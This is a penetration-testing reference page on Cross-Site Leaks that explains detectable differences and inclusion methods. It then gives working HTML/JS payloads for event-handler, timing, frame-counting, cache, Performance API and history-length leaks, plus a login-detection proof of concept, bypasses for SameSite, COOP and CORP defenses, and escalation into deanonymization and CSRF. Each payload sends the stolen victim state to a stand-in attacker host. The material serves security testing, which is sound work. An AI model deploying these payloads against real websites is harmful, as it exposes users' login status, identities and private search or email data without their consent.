# XS-Leaks (Cross-Site Leaks)

> **Summary**: Cross-Site Leaks (XS-Leaks) are a class of side-channel attacks that exploit browser behavior to infer cross-origin information by measuring observable differences in how a target application responds to requests from an attacker-controlled page.
> **Impact**: Deanonymization of users, detection of login state, extraction of sensitive cross-origin data (search results, email content, private profile information), CSRF token inference.
> **Typical Severity**: Medium to High

## Detection

### Indicators
- Application returns different responses (status codes, sizes, redirects, frame counts) based on user state or query content
- No SameSite cookie attribute or set to `None`
- Missing `Cross-Origin-Opener-Policy` (COOP) and `Cross-Origin-Resource-Policy` (CORP) headers
- Application uses query parameters that influence response characteristics (search, filters)

### Automated Detection
- Use [XSinator](https://xsinator.com/) to test browser leak techniques
- Check for missing security headers: COOP, CORP, COEP
- Verify SameSite cookie attributes

### Manual Detection
1. Identify endpoints where response varies based on authenticated state or user-specific data
2. Test if the endpoint can be loaded cross-origin (iframe, img, script, fetch)
3. Measure observable differences: load time, error events, frame count, redirect behavior
4. Determine if differences are consistent enough to leak information reliably

## Core Concepts

### Components of an XS-Leak Attack

| Component | Description |
|-----------|-------------|
| **Vulnerable Web** | Target application from which information is extracted |
| **Attacker's Web** | Malicious page hosted by the attacker, visited by the victim |
| **Inclusion Method** | How the target is incorporated: iframe, img, script, fetch, window.open, link |
| **Leak Technique** | How differences are observed: timing, error events, frame count, cache, etc. |
| **Detectable Difference** | What varies between states: status code, redirect, content size, headers |

### Detectable Differences

- **Status Code**: Different HTTP codes for authenticated vs. unauthenticated (200 vs. 302 vs. 403)
- **Redirects**: Navigation to login page vs. content page
- **Page Content Size**: Response body size varies based on search results or user data
- **Number of Frames**: Different number of iframes in response based on state
- **HTTP Headers**: Presence/absence of `X-Frame-Options`, `Content-Disposition`, etc.
- **Timing**: Response time differs based on database queries or processing (e.g., search with results vs. no results)
- **API Usage**: Whether a page uses specific Web APIs (detectable via side effects)

### Inclusion Methods

- **HTML Elements**: `<img>`, `<script>`, `<link>`, `<video>`, `<audio>`, `<object>`, `<embed>`
- **Iframes**: `<iframe>` (if not blocked by X-Frame-Options or frame-ancestors)
- **Pop-ups**: `window.open()` (provides window handle for property inspection)
- **Fetch/XHR**: `fetch()` or `XMLHttpRequest` (limited by CORS, but timing still measurable)

## Exploitation

### Prerequisites
- Victim visits attacker-controlled page while authenticated to the target application
- Target application has detectable cross-origin state differences
- Browser does not block the inclusion method (SameSite cookies, COOP, CORP)

### Step-by-Step

1. **Identify a state-dependent endpoint**: Find a URL that behaves differently based on user state.
   - Example: `/search?q=secret` returns 200 with results or 200 with empty body
   - Example: `/admin/` returns 200 for admins, 302 for non-admins

   **Success**: Endpoint identified where response characteristics vary.

2. **Choose an inclusion method**: Determine how to load the target cross-origin.
   **Success**: Target page loads in the attacker's context.

3. **Select a leak technique**: Based on the detectable difference, choose the appropriate measurement.
   **Success**: Technique reliably distinguishes between states.

4. **Build the exploit page**: Create HTML/JS that automates the leak and exfiltrates results.
   **Success**: Attacker page correctly infers target state.

### Payloads

#### Event Handler Leak (onload/onerror)
Distinguish between success (200) and error (4xx/5xx) responses:
```html
<script>
function probe(url) {
    return new Promise((resolve) => {
        var script = document.createElement('script');
        script.src = url;
        script.onload = () => resolve(true);
        script.onerror = () => resolve(false);
        document.body.appendChild(script);
    });
}

probe('https://target.com/admin/').then(isAdmin => {
    fetch('https://<ATTACKER>/leak?admin=' + isAdmin);
});
</script>
```

#### Script-less Error Event (No JS Required)
```html
<object data="https://target.com/admin/">
  <object data="https://<ATTACKER>/user-is-not-admin"></object>
</object>
```
If the first object fails (not admin), the fallback loads, notifying the attacker.

#### Timing Side-Channel (Network Timing)
```html
<script>
async function timeFetch(url) {
    const start = performance.now();
    try {
        await fetch(url, { mode: 'no-cors', credentials: 'include' });
    } catch(e) {}
    return performance.now() - start;
}

async function leak() {
    const time1 = await timeFetch('https://target.com/search?q=secret_exists');
    const time2 = await timeFetch('https://target.com/search?q=random_nonexistent');
    fetch('https://<ATTACKER>/leak?t1=' + time1 + '&t2=' + time2);
}
leak();
</script>
```

#### Frame Counting
Count the number of frames in a cross-origin window to infer content:
```html
<script>
var win = window.open('https://target.com/search?q=test');
setTimeout(function() {
    // Number of frames reveals if search had results
    var frameCount = win.length;
    fetch('https://<ATTACKER>/leak?frames=' + frameCount);
    win.close();
}, 3000);
</script>
```

#### Cache Probing
Detect if a resource was previously loaded by the victim:
```html
<script>
async function isCached(url) {
    const start = performance.now();
    try {
        await fetch(url, { mode: 'no-cors', cache: 'force-cache' });
    } catch(e) {}
    const time = performance.now() - start;
    return time < 5;  // Cached resources load much faster
}

isCached('https://target.com/profile-image.jpg').then(cached => {
    fetch('https://<ATTACKER>/leak?cached=' + cached);
});
</script>
```

#### Performance API Leak
Use the Performance API to measure resource loading characteristics:
```html
<script>
// Clear existing entries
performance.clearResourceTiming();

// Load target resource
var img = new Image();
img.src = 'https://target.com/api/check-status';

setTimeout(function() {
    var entries = performance.getEntriesByType('resource');
    var entry = entries.find(e => e.name.includes('check-status'));
    if (entry) {
        // transferSize, encodedBodySize reveal response characteristics
        fetch('https://<ATTACKER>/leak?size=' + entry.transferSize);
    }
}, 2000);
</script>
```

#### History Length Leak
Detect cross-origin redirects by monitoring history length:
```html
<script>
var initialLength = history.length;
var iframe = document.createElement('iframe');
iframe.src = 'https://target.com/protected-page';
document.body.appendChild(iframe);

setTimeout(function() {
    // If a redirect occurred, history length may change
    var redirected = (history.length !== initialLength);
    fetch('https://<ATTACKER>/leak?redirected=' + redirected);
}, 3000);
</script>
```

#### Content-Length via Error Messages
```html
<script>
var start = performance.now();
fetch('https://target.com/search?q=keyword', {
    mode: 'no-cors',
    credentials: 'include'
}).then(() => {
    var duration = performance.now() - start;
    // Larger responses take longer -- infer content presence
    navigator.sendBeacon('https://<ATTACKER>/leak', JSON.stringify({
        query: 'keyword',
        duration: duration
    }));
});
</script>
```

### Proof of Concept

```html
<!DOCTYPE html>
<html>
<head><title>XS-Leak PoC - Login Detection</title></head>
<body>
<h3>XS-Leak: Detecting if victim is logged into target.com</h3>
<script>
// Method: onload/onerror on image from authenticated endpoint
var img = new Image();
img.onload = function() {
    document.body.innerHTML += '<p>User IS logged in to target.com</p>';
    fetch('https://<ATTACKER>/leak?logged_in=true');
};
img.onerror = function() {
    document.body.innerHTML += '<p>User is NOT logged in to target.com</p>';
    fetch('https://<ATTACKER>/leak?logged_in=false');
};
img.src = 'https://target.com/api/profile-picture';
</script>
</body>
</html>
```

## Bypasses

- If SameSite=Lax blocks cookies on subresource requests, use top-level navigation (window.open) instead
- If CORP blocks resource loading, try using `<link rel="preconnect">` or DNS timing
- If X-Frame-Options blocks iframing, use `window.open()` for pop-up-based leaks
- If the target implements COOP, window handle properties become unavailable -- fall back to timing or cache probing

## Escalation

- **Login detection to targeted attacks**: Confirm victim is logged in before launching CSRF or phishing
- **Search oracle to data extraction**: Binary search through characters to extract secret data one bit at a time
- **User deanonymization**: Determine if the visitor is a specific user by probing user-specific URLs
- **Email content leakage**: Detect presence of specific emails via search-based timing oracles
- Chain with [CSRF](csrf.md) to perform state-changing attacks after confirming user state

## Tools

| Tool | Usage |
|------|-------|
| XSinator | [xsinator.com](https://xsinator.com/) -- Automated XS-Leak testing across browsers |
| xsleaks.dev | [xsleaks.dev](https://xsleaks.dev/) -- Comprehensive XS-Leaks wiki and technique catalog |
| Burp Suite | Test timing differences and response characteristics |
| Custom HTML/JS | Most XS-Leak attacks require custom exploit pages |

## References

- [XS-Leaks Wiki](https://xsleaks.dev/)
- [XSinator Paper](https://xsinator.com/paper.pdf)
- [USENIX Security 2019 - XS-Leaks](https://www.usenix.org/conference/usenixsecurity19/presentation/staicu)
- [HTTPLeaks - cure53](https://github.com/nicornk/HTTPLeaks)

## Cross-References

- [CSRF](csrf.md) -- XS-Leaks can confirm user state before CSRF attacks
- [CORS](cors.md) -- CORS misconfigurations may amplify XS-Leak impact
- [Cookie-Based Attacks](cookie-based-attacks.md) -- SameSite cookies are a primary defense against XS-Leaks
